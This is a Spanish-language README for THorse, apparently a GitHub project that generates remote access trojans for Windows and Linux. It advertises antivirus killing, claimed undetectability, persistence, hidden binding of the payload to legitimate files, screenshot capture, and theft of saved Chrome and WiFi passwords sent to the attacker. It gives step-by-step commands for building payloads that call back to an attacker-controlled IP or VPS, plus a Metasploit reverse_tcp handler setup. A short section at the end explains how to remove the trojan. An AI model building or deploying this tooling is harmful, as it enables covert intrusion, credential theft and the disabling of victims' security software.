<h1 align="center">THorse</h1>
<p align="center">
    <a href="https://python.org">
    <img src="https://img.shields.io/badge/Python-3.7-green.svg">
  </a>
  <a href="https://github.com/PushpenderIndia/thorse/blob/master/LICENSE">
    <img src="https://img.shields.io/badge/License-BSD%203-lightgrey.svg">
  </a>
  <a href="https://github.com/PushpenderIndia/thorse/releases">
    <img src="https://img.shields.io/badge/Release-1.7-blue.svg">
  </a>
    <a href="https://github.com/PushpenderIndia/thorse">
    <img src="https://img.shields.io/badge/Open%20Source-%E2%9D%A4-brightgreen.svg">
  </a>
</p>

<p align="center">
  THorse es un Generador de RAT (Troyano de Administración Remota) para sistemas Windows/Linux escrito en Python 3.
</p>

Descargo de responsabilidad

<p align="center">
  :computer: Este proyecto fue creado solo con buenos propósitos y uso personal.
</p>

ESTE SOFTWARE SE PROPORCIONA "TAL CUAL" SIN GARANTÍA DE NINGÚN TIPO. PUEDE USAR ESTE SOFTWARE BAJO SU PROPIO RIESGO. EL USO ES RESPONSABILIDAD COMPLETA DEL USUARIO FINAL. LOS DESARROLLADORES NO ASUMEN NINGUNA RESPONSABILIDAD Y NO SON RESPONSABLES DE NINGÚN MAL USO O DAÑO CAUSADO POR ESTE PROGRAMA.

Características

☑ Funciona en Windows/Linux
☑ Notifica Nueva Víctima Vía Email
☑ Indetectable
☑ No requiere privilegios de root o administrador
☑ Persistencia
☑ Envía Captura de Pantalla de la Pantalla del PC de la Víctima vía email
☑ Da Acceso Completo de Meterpreter al Atacante
☑ Nunca requirió tener metasploit instalado para crear el troyano
☑ Crea un Binario Ejecutable Sin Dependencias
☑ Crea un payload de menor tamaño ~ 5mb con funcionalidad avanzada
☑ Ofusca el Payload antes de Compilarlo, evitando así algunos antivirus más
☑ El Payload Generado está Codificado con Base64, lo que hace extremadamente difícil la ingeniería inversa del payload
☑ Mata el Antivirus en el PC de la Víctima e Intenta deshabilitar el Centro de Seguridad de Windows
☑ Interfaz Colorida Impresionante para generar el payload
☑ En el Lado del Atacante: Al Crear el Payload, el Script Detecta Automáticamente Dependencias Faltantes y las Instala
☑ Capaz de agregar un ícono personalizado al archivo malicioso
☑ Binder Integrado que puede vincular un ejecutable a Cualquier Archivo [.pdf, .txt, .exe etc], Ejecutando el archivo legítimo en primer plano y los códigos maliciosos en segundo plano como un servicio.
☑ Verifica si hay una Instancia Ya en Ejecución en el Sistema, Si se encuentra una instancia en ejecución, entonces solo se ejecuta el archivo legítimo [Prohibidor de Múltiples Instancias].
☑ El Atacante puede Crear/Compilar tanto para Windows/Linux OS Usando un Sistema Linux, Pero Solo Puede Crear/Compilar un Ejecutable de Windows usando una Máquina Windows
☑ Recupera Contraseñas Guardadas del sistema de la víctima y las envía al Atacante.

Recuperaciones Soportadas, Intenta Recuperar Contraseñas Guardadas de:
Navegador Chrome
WiFi

Nota: El Stealer Personalizado está Codificado, no depende de LaZagne

Probado En

https://www.google.com/s2/favicons?domain=https://www.kali.org/ Kali Linux - EDICIÓN ROLLING

https://www.google.com/s2/favicons?domain=https://www.microsoft.com/en-in/windows/ Windows 10

https://www.google.com/s2/favicons?domain=https://www.microsoft.com/en-in/windows/ Windows 8.1 - Pro

https://www.google.com/s2/favicons?domain=https://www.microsoft.com/en-in/windows/ Windows 7 - Ultimate

Las siguientes son las limitaciones del payload de meterpreter generado usando metasploit:-

· Tienes que ejecutar el Listener de Metasploit antes de ejecutar el backdoor
· El backdoor en sí no se vuelve persistente, tenemos que usar los módulos de post-explotación para hacer que el backdoor sea persistente. 
  Y los módulos de post-explotación solo pueden usarse después de una explotación exitosa.
· No Nos Notifica cada vez que el payload se ejecuta en un nuevo sistema.

Todos sabemos lo poderoso que es el payload de Meterpreter, pero aún así el payload hecho a partir de él no es satisfactorio.

Las siguientes son las características de este generador de payload que te darán una buena idea de este script de python:-

· Usa el registro de Windows para volverse persistente en Windows.
· También logra volverse persistente en el sistema Linux.
· El Payload puede ejecutarse tanto en LINUX como en WINDOWS.
· Proporciona Acceso Completo, ya que se puede usar el listener de metasploit así como también soporta un listener personalizado (Puedes Crear Tu Propio Listener)
· Envía Notificación por Email, cada vez que el payload se ejecuta en un nuevo sistema, con información completa del sistema.
· Genera el payload en 1 minuto o incluso menos.
· Soporta todos los módulos de post-explotación de meterpreter.
· El Payload Puede ser Creado tanto en Windows como en Linux.

Requisito Previo

☑ Python 3.X
☑ Algunos Módulos Externos

Por Favor Nota:

En Windows, Por Favor Especifica/Establece la ruta de Pyinstaller en paygen.py [Línea 14]

La Ruta Predeterminada es esta: PYTHON_PYINSTALLER_PATH = os.path.expanduser("C:/Python37-32/Scripts/pyinstaller.exe")

Cámbialo según tu sistema

Cómo Usar en Linux

```bash
# Instalar dependencias 
$ Instalar la última versión de python 3.x

# Navegar al directorio /opt (opcional)
$ cd /opt/

# Clonar este repositorio
$ git clone https://github.com/PushpenderIndia/thorse.git

# Ir al repositorio
$ cd thorse

# Instalando dependencias
$ bash installer_linux.sh

# Si estás obteniendo errores al ejecutar installer_linux.sh, intenta instalar usando installer_linux.py
$ python3 installer_linux.py

$ chmod +x paygen.py
$ python3 paygen.py --help

# Creando Payload/RAT
$ python3 paygen.py --ip 127.0.0.1 --port 8080 -e youremail@gmail.com -p YourEmailPass -l -o output_file_name --icon icon_path

# Creando Payload/RAT con AVKiller Personalizado [Por Defecto, Toneladas de AntiVirus Conocidos son agregados en Kill_Targets]
$ python3 paygen.py --ip 127.0.0.1 --port 8080 -e youremail@gmail.com -p YourEmailPass -l -o output_file_name --icon icon_path --kill_av AntiVirus.exe

# Creando Payload/RAT con Tiempo Personalizado para volverse persistente
$ python3 paygen.py --ip 127.0.0.1 --port 8080 -e youremail@gmail.com -p YourEmailPass -l -o output_file_name --icon icon_path --persistence 10 

Nota: También puedes usar nuestros íconos personalizados de la carpeta icon, solo úsalos así --icon icon/pdf.ico
```

Cómo Usar en VPS (Recomendado)

```
# 1. Configura un VPS, Puedes comprar un VPS Ubuntu de cualquier Proveedor de VPS como Digital Ocean, Linode, AWS, etc

# 2. Conéctate a tu VPS Usando SSH
$ ssh username@ip_address

# 3. Actualiza Tu VPS Linux
$ sudo apt update

# 4. Agrega el Repositorio de Kali Linux
$ sudo sh -c "echo 'deb https://http.kali.org/kali kali-rolling main non-free contrib' > /etc/apt/sources.list.d/kali.list"

# 5. Instala el paquete gnupg
$ sudo apt install gnupg

# 6. Agrega las Claves Públicas de Kali
$ wget 'https://archive.kali.org/archive-key.asc' && sudo apt-key add archive-key.asc

# 7. Actualiza el VPS
$ sudo apt update

# 8. Establece la Prioridad de Kali
$ sudo sh -c "echo 'Package: *'>/etc/apt/preferences.d/kali.pref; echo 'Pin: release a=kali-rolling'>>/etc/apt/preferences.d/kali.pref; echo 'Pin-Priority: 50'>>/etc/apt/preferences.d/kali.pref"

# 9. Actualiza el VPS
$ sudo apt update

# 10. Instala Metasploit Framework en el VPS
$ sudo apt install -t kali-rolling metasploit-framework

# NOTA: Los Pasos Anteriores necesitan ser realizados solo una vez 

# 11. Instala pip3
$ sudo apt install python3-pip

# 12. Clona este repositorio
$ git clone https://github.com/PushpenderIndia/thorse.git

# 13. Ir al repositorio
$ cd thorse

# 14. Instalando dependencias
$ bash installer_linux.sh

# 15. Si estás obteniendo errores al ejecutar installer_linux.sh, intenta instalar usando installer_linux.py
$ python3 installer_linux.py

$ 16. chmod +x paygen.py
$ python3 paygen.py --help

# Creando Payload/RAT (Si quieres Compilar el RAT para Windows, entonces Construye el RAT en una Máquina Windows y Usa el VPS para Controlar el RAT Remotamente)
$ python3 paygen.py --ip VPS_Public_IP_Address --port 8080 -e youremail@gmail.com -p YourEmailPass -l -o output_file_name --icon icon_path

# Creando Payload/RAT con AVKiller Personalizado [Por Defecto, Toneladas de AntiVirus Conocidos son agregados en Kill_Targets]
$ python3 paygen.py --ip VPS_Public_IP_Address --port 8080 -e youremail@gmail.com -p YourEmailPass -l -o output_file_name --icon icon_path --kill_av AntiVirus.exe

# Creando Payload/RAT con Tiempo Personalizado para volverse persistente
$ python3 paygen.py --ip VPS_Public_IP_Address --port 8080 -e youremail@gmail.com -p YourEmailPass -l -o output_file_name --icon icon_path --persistence 10 

Nota: También puedes usar nuestros íconos personalizados de la carpeta icon, solo úsalos así --icon icon/pdf.ico
```

Cómo Usar en Windows

```bash
# Instalar dependencias 
$ Instalar la última versión de python 3.x

# Clonar este repositorio
$ git clone https://github.com/PushpenderIndia/thorse.git

# Ir al repositorio
$ cd thorse

# Instalando dependencias
$ python -m pip install -r requirements.txt

# Abre paygen.py en un editor de texto y Configura la Línea 15, establece la ruta de Pyinstaller, La Ruta Predeterminada es la siguiente:-
# PYTHON_PYINSTALLER_PATH = os.path.expanduser("C:/Python37-32/Scripts/pyinstaller.exe") 

# Obteniendo el Menú de Ayuda
$ python paygen.py --help

# Creando Payload/RAT
$ python paygen.py --ip 127.0.0.1 --port 8080 -e youremail@gmail.com -p YourEmailPass -w -o output_file_name --icon icon_path

# Creando Payload/RAT con AVKiller Personalizado [Por Defecto, Toneladas de AntiVirus Conocidos son agregados en Kill_Targets]
$ python paygen.py --ip 127.0.0.1 --port 8080 -e youremail@gmail.com -p YourEmailPass -l -o output_file_name --icon icon_path --kill_av AntiVirus.exe

# Creando Payload/RAT vinculado con un archivo legítimo [Cualquier archivo .exe, .pdf, .txt etc]
$ python paygen.py --ip 127.0.0.1 --port 8080 -e youremail@gmail.com -p YourEmailPass -l -o output_file_name --icon icon/txt.ico --bind passwords.txt 

Nota: También puedes usar nuestros íconos personalizados de la carpeta icon, solo úsalos así --icon icon/pdf.ico
```

Nota:- El Archivo Malicioso será guardado dentro de la carpeta dist/, dentro de la carpeta technowhorse/

Estableciendo Conexión Usando Msfconsole

· Necesitas Instalar Metasploit-Framework en tu sistema para establecer la conexión
· Configuración Recomendada, Puedes intentar probarlo con cualquier otro payload en la línea 2

```
$ sudo msfconsole
msf3> use exploit/multi/handler
msf3> set payload python/meterpreter/reverse_tcp
msf3> set LHOST 192.168.43.221
msf3> set LPORT 443
msf3> run
```

Cómo Actualizar

· Ejecuta updater.py para Actualizar Automáticamente o Descarga el Zip más reciente de este repositorio de GitHub
· Nota: Git Debe estar Instalado para poder usar updater.py

Argumentos Disponibles

· Argumentos Opcionales

Forma Corta Forma Completa Descripción
-h --help muestra este mensaje de ayuda y sale
-k KILL_AV --kill_av KILL_AV AntivirusKiller : Especifica el .exe del AV que necesita ser eliminado. Ej:- --kill_av cmd.exe
-t TIME_IN_SECONDS --persistence TIME_PERSISTENT Volverse Persistente Después de __ segundos. predeterminado=10
-w --windows Genera un ejecutable de Windows.
-l --linux Genera un ejecutable de Linux.
-b file.txt --bind LEGITIMATE_FILE_PATH.pdf AutoBinder : Especifica la Ruta del archivo Legítimo. [SO Soportado : Windows]
-s --steal-password Roba Contraseñas Guardadas de la Máquina de la Víctima [SO Soportado : Windows]
-d --debug Ejecuta el Virus en Primer Plano

Nota : Ya sea -w/--windows o -l/--linux debe ser especificado

· Argumentos Requeridos

Forma Corta Forma Completa Descripción
 --icon ICON Especifica la Ruta del Ícono, Ícono del Archivo Malicioso [Nota : Debe Ser .ico]
 --ip IP_ADDRESS Dirección de correo electrónico a la que enviar los informes.
 --port PORT Puerto de la Dirección IP dada en el argumento --ip.
-e EMAIL --email EMAIL Dirección de correo electrónico a la que enviar los informes.
-p PASSWORD --password PASSWORD Contraseña para la dirección de correo electrónico dada en el argumento -e.
-o OUT --out OUT Nombre del archivo de salida.

Nuevas Capturas de Pantalla:

Obteniendo Ayuda

/img/1.version1.4.PNG

Generando payload

/img/2.version1.4.PNG

También Consulta Estas Imágenes Antiguas

~Capturas de Pantalla Antiguas:

Obteniendo Ayuda

/img/1.help.png

Ejecutando el Script paygen.py

/img/2.running_script.png

Cuando el RAT se ejecuta, agrega Registro para volverse persistente

/img/3.added_registry_for_persistence.png

Hace una copia de sí mismo y la guarda dentro de Roming

/img/4.rat_saved_roming.png

Informe enviado por el RAT

/img/5.report_from_rat.png

Recibiendo Notificación Del PC de la Víctima

/img/6.getting_notification.png

Contribuidores:

Actualmente este repositorio es mantenido por mí (Pushpender Singh). Pero si quieres convertirte en contribuidor, entonces agrega alguna característica interesante y haz una pull request, la revisaré y la fusionaré en este repositorio.

Todas las pull requests de los contribuidores serán aceptadas si su pull request es digna para este repositorio.

TODO

☐ Agregar nuevas características
☐ Contribuir con GUI

Eliminando TechNowHorse en Windows:

Método 1:

· Ve a inicio, escribe regedit y ejecuta el primer programa, esto abrirá el editor de registro.
· Navega a la siguiente ruta Computer\HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run Debería haber una entrada llamada winexplorer, haz clic derecho en esta entrada y selecciona Eliminar.
· Ve a la ruta de tu usuario > AppData > Roaming, verás un archivo llamado "explorer.exe", este es el RAT, clic derecho > Eliminar.
· Reinicia el Sistema.

Método 2:

· Ejecuta "RemoveTHorse.bat" en el Sistema Infectado y luego reinicia el PC para detener el Archivo Malicioso que se está Ejecutando actualmente.

Eliminando TechNowHorse en Linux:

· Abre el archivo Autostart con cualquier editor de texto,
  Ruta del Archivo Autostart: ~/.config/autostart/xinput.desktop
· Elimina estas 5 líneas:
  
· Nota: destination_file_name es el nombre del archivo malicioso que le diste 
  a tu TrojanHorse usando el parámetro -o
· Reinicia tu sistema y luego elimina el archivo malicioso almacenado en esta ruta de abajo
· Ruta de Destino, donde se almacena el TrojanHorse : ~/.config/xnput

Contribuidores

· Lista de Contribuidores Dedicados: Contribuidores

<!-- ALL-CONTRIBUTORS-LIST:START - Do not remove or modify this section -->

<!-- prettier-ignore-start -->

<!-- markdownlint-disable -->

<table>
<tr>

<td align="center">
    <a href="https://github.com/PushpenderIndia">
        <kbd><img src="https://avatars3.githubusercontent.com/PushpenderIndia?size=400" width="100px;" alt=""/></kbd><br />
        <sub><b>Pushpender Singh</b></sub>
    </a><br />
    <a href="https://github.com/PushpenderIndia/thorse/commits?author=PushpenderIndia" title="Code"> :computer: </a> 
</td>

</tr>
</tr>
</table>

<!-- markdownlint-enable -->

<!-- prettier-ignore-end -->

<!-- ALL-CONTRIBUTORS-LIST:END -->

¡Contribuciones de cualquier tipo son bienvenidas!

NOTA: ¡Si deberías estar en la lista de contribuidores pero te olvidamos, entonces háznoslo saber!

Lista de TODO

· Sugiere tu propia característica : )
· Desarrollo de GUI
· Corrección de Errores
· Agregar más stealers de contraseñas de navegadores
